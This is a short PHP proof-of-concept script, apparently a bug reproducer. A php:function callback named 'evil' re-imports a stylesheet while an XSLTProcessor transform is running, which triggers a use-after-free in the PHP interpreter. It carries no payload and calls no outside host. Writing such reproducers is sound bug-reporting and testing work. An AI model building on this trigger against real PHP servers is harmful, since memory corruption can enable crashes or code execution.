<?php
// XSLTProcessor php:function callback calls $proc->importStylesheet() on the SAME
// processor mid-transform. importStylesheet -> xsl_free_sheet(intern) frees the
// stylesheet that xsltApplyStylesheetUser (xsltprocessor.c:406) is applying -> UAF.
$xml = new DOMDocument();
$xml->loadXML('<root><item>a</item><item>b</item><item>c</item></root>');

$xsl = new DOMDocument();
$xsl->loadXML('<?xml version="1.0"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
  <xsl:template match="/">
    <xsl:for-each select="//item">
      <xsl:value-of select="php:function(\'evil\')"/>
    </xsl:for-each>
  </xsl:template>
</xsl:stylesheet>');

$proc = new XSLTProcessor();
$proc->registerPHPFunctions();
$proc->importStylesheet($xsl);
$GLOBALS['proc'] = $proc;

$xsl2 = new DOMDocument();
$xsl2->loadXML('<?xml version="1.0"?><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"><xsl:template match="/">x</xsl:template></xsl:stylesheet>');
$GLOBALS['xsl2'] = $xsl2;

function evil() {
    $GLOBALS['proc']->importStylesheet($GLOBALS['xsl2']); // frees the running stylesheet
    return 'z';
}

echo $proc->transformToXml($xml);
echo "done\n";
